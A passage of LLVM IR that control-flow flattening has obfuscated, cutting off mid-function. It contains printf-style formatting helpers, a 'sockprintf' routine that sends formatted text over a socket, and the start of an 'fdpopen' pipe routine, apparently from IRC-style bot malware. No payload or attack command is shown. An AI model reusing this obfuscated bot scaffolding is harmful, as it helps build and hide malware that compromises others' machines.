  store i32 365009222, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 365009222, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -1650774188, i32 -1117462462
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 1766370016, i32 2028984770
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 -472179777, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 -472179777, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 1812075268, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -1240201101, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 1812075268, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 758707723, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -225307517, i32 1631030309
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1631030309, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1342692574, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1342692574, label %first
    i32 9733557, label %16
    i32 -807510504, label %18
    i32 -511625597, label %23
    i32 -732020383, label %26
    i32 2104466305, label %29
    i32 17527140, label %34
    i32 -1170214297, label %35
    i32 -993639604, label %39
    i32 -1429406209, label %44
    i32 523944307, label %45
    i32 426485105, label %46
    i32 122201591, label %51
    i32 -957579946, label %52
    i32 -751817556, label %56
    i32 1398624649, label %61
    i32 -604965072, label %64
    i32 -1766879355, label %65
    i32 -1496656786, label %66
    i32 -466163743, label %71
    i32 -51595869, label %78
    i32 -1026599796, label %81
    i32 2045215646, label %82
    i32 -1693041861, label %86
    i32 -1458714195, label %91
    i32 435478701, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 9733557, i32 426485105
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -807510504, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -511625597, i32 2104466305
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -732020383, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -807510504, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 17527140, i32 -1170214297
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -993639604, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -993639604, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -1429406209, i32 523944307
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 523944307, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 426485105, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -1766879355, i32 122201591
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -957579946, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -751817556, i32 -604965072
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 1398624649, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -957579946, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -1766879355, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1496656786, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -466163743, i32 -1026599796
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -51595869, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -1496656786, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 2045215646, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -1693041861, i32 435478701
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -1458714195, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 2045215646, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -692085090, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -692085090, label %first
    i32 -1345025194, label %26
    i32 1964593844, label %34
    i32 797032077, label %38
    i32 1043830925, label %42
    i32 -661045659, label %46
    i32 1728526627, label %49
    i32 -2109332399, label %54
    i32 -1306116729, label %58
    i32 -2117494386, label %65
    i32 -997428104, label %71
    i32 -2132823766, label %80
    i32 111905685, label %84
    i32 1980598606, label %88
    i32 1473754678, label %93
    i32 1458748887, label %99
    i32 -1496560889, label %102
    i32 1913466891, label %103
    i32 1323080755, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -1345025194, i32 1964593844
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1323080755, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 797032077, i32 1728526627
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 1043830925, i32 1728526627
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -661045659, i32 1728526627
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 1728526627, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -2109332399, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -1306116729, i32 -2132823766
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -2117494386, i32 -997428104
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -997428104, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -2109332399, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 111905685, i32 1913466891
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 1980598606, i32 1458748887
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1473754678, i32 1458748887
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -1496560889, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -1496560889, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1913466891, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1323080755, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -1403905945, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1403905945, label %first
    i32 1228212642, label %8
    i32 662487805, label %16
    i32 1961741397, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 1228212642, i32 662487805
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 1961741397, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 1961741397, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1159480242, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1159480242, label %first
    i32 202452929, label %15
    i32 -331479350, label %21
    i32 417256136, label %28
    i32 581473739, label %29
    i32 1389983132, label %34
    i32 1109661786, label %35
    i32 -1744192972, label %39
    i32 -969180227, label %43
    i32 -2099604732, label %44
    i32 -1121652854, label %54
    i32 10600345, label %55
    i32 1597075361, label %61
    i32 1191764991, label %NodeBlock
    i32 -1858577670, label %LeafBlock1
    i32 -2030352216, label %LeafBlock
    i32 -617971862, label %66
    i32 1375302514, label %73
    i32 1441012026, label %79
    i32 -376994151, label %84
    i32 -1625232556, label %91
    i32 -196323865, label %95
    i32 -1122607262, label %100
    i32 1005238355, label %107
    i32 -1385738798, label %111
    i32 100316055, label %NewDefault
    i32 1496634611, label %114
    i32 179824884, label %120
    i32 -1601560934, label %126
    i32 1838691760, label %132
    i32 -1767870497, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 202452929, i32 -331479350
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 417256136, i32 -331479350
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 417256136, i32 581473739
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1767870497, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 1389983132, i32 1109661786
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1767870497, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
